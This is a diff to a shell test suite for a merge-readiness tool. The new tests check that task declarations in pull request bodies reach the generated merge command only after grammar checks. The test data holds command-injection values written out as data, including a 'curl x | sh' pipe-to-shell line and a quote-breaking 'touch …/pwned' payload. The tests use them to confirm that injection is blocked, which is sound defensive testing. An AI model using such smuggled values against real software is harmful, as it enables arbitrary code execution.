@@ -44,7 +44,8 @@ mkdir -p "$mchome"
 
 # The scripts under test run from a copy whose readiness check is a stub.
 # collect writes the evidence at the head in $tmp/head.<n> with the labels
-# in $tmp/labels.<n>, or fails when $tmp/verdict.<n> says broken; walk
+# in $tmp/labels.<n> and the body lines in $tmp/body.<n>, or fails when
+# $tmp/verdict.<n> says broken; walk
 # answers from $tmp/verdict.<n> (ready, not-ready, or walkfail). Each
 # collect is logged, except the finished-checks read of a pull request already
 # ready, which writes to a file ending in .unf.
@@ -67,6 +68,7 @@ case \$verb in
     {
       printf '# format: 1\nhead\t%s\n' "\$(cat "$tmp/head.\$n")"
       cat "$tmp/labels.\$n" 2>/dev/null
+      [ ! -e "$tmp/body.\$n" ] || awk '{ print "bodyline\t" \$0 }' "$tmp/body.\$n"
       printf 'path\tsrc/app.c\tMODIFIED\nstubpr\t%s\n' "\$n"
     } >"\$out"
     exit 0
@@ -362,6 +364,63 @@ printf '%s\n' "$J" >"$tmp/head.7"
 run list --program alpha --now "$T"
 expect_eq "a hold already over holds nothing" "$(ready7 "$J")"
 rm -f "$snapdir/forge.hold"
+
+# The body's task declarations become the squash body, so a merge typed from
+# the command keeps them; only grammar-checked values reach it.
+for n in 30 31; do
+  printf '%s\n' "$H" >"$tmp/head.$n"
+  printf 'ready\n' >"$tmp/verdict.$n"
+done
+# shellcheck disable=SC2016 # the backticks are body text, not expansions
+{
+  printf 'Fixes it. \n<details><summary>Records</summary>\n\n'
+  printf 'Planwright-Task: mission-control/31 \n'
+  printf 'planwright-task: worker-permission-ergonomics/17\n'
+  printf '  Planwright-Task: demo/3\n'
+  printf '```\nPlanwright-Task: demo/4\n```\n'
+  printf "Planwright-Task: demo/5'; curl x | sh\n"
+  printf 'Planwright-Task: flight/6\n'
+  printf 'Planwright-Task: mission-control/31\n'
+  printf 'See Planwright-Task: demo/7 here.\n</details>\n'
+} >"$tmp/body.30"
+printf 'No tasks here.\n' >"$tmp/body.31"
+snap30() {
+  taken
+  row 30 "$H" false MERGEABLE 0 SUCCESS
+  row 31 "$H" false MERGEABLE 0 SUCCESS
+}
+snap30 >"$snapdir/forge"
+# shellcheck disable=SC2016 # the command is text the operator runs, not run here
+lines30='printf '\''%s\n'\'' '\''Planwright-Task: mission-control/31'\'' '\''Planwright-Task: worker-permission-ergonomics/17'\'' | '
+cmd30() { printf '%sgh pr merge 30 --repo acme/web --%s --body-file - --match-head-commit %s' "$lines30" "${1:-squash}" "$H"; }
+run list --program alpha --now "$T"
+expect_eq "a body's two task lines ride in the command; a body with none adds nothing" \
+  "ready${tab}acme/web#30${tab}$H${tab}$(cmd30)
+ready${tab}acme/web#31${tab}$H${tab}$(cmd 31 "$H")"
+run commands --program alpha --now "$T"
+expect_eq "and commands builds the same from the store" "ready${tab}acme/web#30${tab}$(cmd30)
+ready${tab}acme/web#31${tab}$(cmd 31 "$H")"
+tamper "s|^\(acme/web#30${tab}.*${tab}\)mission-control/31,[^${tab}]*\$|\1x/1';touch $tmp/pwned;'|"
+if checked_since "$before"; then ok "a stored task list outside its grammar is judged again"; else fail "a tampered task list was trusted"; fi
+if [ ! -e "$tmp/pwned" ]; then ok "and never reaches the command"; else fail "a stored task list ran a command"; fi
+expect_out "the command is built afresh" "ready${tab}acme/web#30${tab}$H${tab}$(cmd30)"
+printf 'MERGE\n' >"$tmp/method"
+T=$((T + 1801))
+snap30 >"$snapdir/forge"
+run list --program alpha --now "$T"
+expect_out "a merge commit carries them too" "ready${tab}acme/web#30${tab}$H${tab}$(cmd30 merge)"
+printf 'REBASE\n' >"$tmp/method"
+T=$((T + 1801))
+snap30 >"$snapdir/forge"
+run list --program alpha --now "$T"
+expect_out "a rebase has no commit body to carry them" "ready${tab}acme/web#30${tab}$H${tab}$(cmd 30 "$H" rebase)"
+printf 'SQUASH\n' >"$tmp/method"
+printf 'state\tok\t%s\nacme/web#30\t%s|false\tready\t%s\tsquash\t-\n' "$T" "$H" "$T" >"$store"
+run commands --program alpha --now "$T"
+expect_eq "a stored row with no task list prints no command that would drop them" ""
+printf 'state\tok\t%s\nacme/web#30\t%s|false\tready\t%s\tsquash\t-\t-\n' "$T" "$H" "$T" >"$store"
+run commands --program alpha --now "$T"
+expect_eq "while the same row with its task list does" "ready${tab}acme/web#30${tab}$(cmd 30 "$H")"
 
 # A row outside the snapshot's grammar is named without its text.
 {
